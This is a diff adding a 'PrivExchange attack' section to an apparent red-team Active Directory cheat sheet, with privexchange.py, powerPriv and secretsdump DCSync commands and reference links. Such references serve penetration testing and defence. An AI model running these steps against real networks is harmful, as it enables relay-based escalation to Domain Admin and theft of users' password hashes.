@@ -19,6 +19,7 @@
   * [NTLMv2 hashes relaying](#ntlmv2-hashes-relaying)
   * [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
   * [Trust relationship between domains](#trust-relationship-between-domains)
+  * [PrivExchange attack](#privexchange-attack)
 * [Privilege Escalation](#privilege-escalation)
   * [PrivEsc Local Admin - Token Impersonation (RottenPotato)](#privesc-local-admin---token-impersonation-rottenpotato)
   * [PrivEsc Local Admin - MS16-032](#privesc-local-admin---ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
@@ -467,6 +468,26 @@ SourceName          TargetName                    TrustType      TrustDirection
 domainA.local      domainB.local                  TreeRoot       Bidirectional
 ```
 
+### PrivExchange attack
+
+Exchange your privileges for Domain Admin privs by abusing Exchange.
+You need a shell on a user account with a mailbox.
+
+1. Subscription to the push notification feature (using privexchange.py or powerPriv), uses the credentials of the current user to authenticate to the Exchange server.
+    ```bash
+    # https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py
+    python privexchange.py -ah xxxxxxx -u xxxx -d xxxxx
+    
+    # https://github.com/G0ldenGunSec/PowerPriv 
+    powerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016
+    ```
+
+2. Relay of the Exchange server authentication and privilege escalation (using ntlmrelayx from Impacket).
+3. Profit using secretdumps from Impacket, the user can now perform a dcsync and get another user's NTLM hash
+    ```bash
+    python secretsdump.py xxxxxxxxxx -just-dc
+    ```
+
 ## Privilege Escalation
 
 ### PrivEsc Local Admin - Token Impersonation (RottenPotato)
@@ -548,3 +569,6 @@ net group "Domain Admins" hacker2 /add /domain
 * [Abusing Kerberos: Kerberoasting - Haboob Team](https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf)
 * [Invoke-Kerberoast - Powersploit Read the docs](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
 * [Kerberoasting - Part 1 - Mubix “Rob” Fuller](https://room362.com/post/2016/kerberoast-pt1/)
+* [[PrivExchange] From user to domain admin in less than 60sec ! - davy](http://blog.randorisec.fr/privexchange-from-user-to-domain-admin-in-less-than-60sec/)
+* [Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin)
+* [Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave](http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html)
